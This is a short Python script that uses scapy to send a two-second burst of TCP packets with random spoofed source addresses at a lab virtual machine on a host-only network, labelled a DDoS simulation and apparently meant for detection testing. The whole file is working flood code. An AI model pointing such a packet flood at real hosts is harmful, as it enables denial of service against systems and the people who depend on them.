import sys
import time
import random
from scapy.all import Ether, IP, TCP, sendp

TARGET_IP = "192.168.56.101"   # Ubuntu IP
INTERFACE = "eth1"             # Host-only interface
NUM_PACKETS = 5000
DURATION = 2

def generate_random_ip():
    return f"192.168.56.{random.randint(2, 254)}"

def send_packets(target_ip, interface, num_packets, duration):
    end_time = time.time() + duration
    packet_count = 0

    print("[INFO] Starting DDoS simulation (multi-IP)...")

    while time.time() < end_time and packet_count < num_packets:
        src_ip = generate_random_ip()

        packet = Ether() / IP(src=src_ip, dst=target_ip) / TCP()
        sendp(packet, iface=interface, verbose=False)

        packet_count += 1

        # Small delay to stabilize output (optional but helpful)
        time.sleep(0.001)

    print(f"[INFO] Sent {packet_count} packets.")

if __name__ == "__main__":
    if sys.version_info[0] < 3:
        print("[ERROR] Requires Python 3")
        sys.exit(1)

    send_packets(TARGET_IP, INTERFACE, NUM_PACKETS, DURATION)
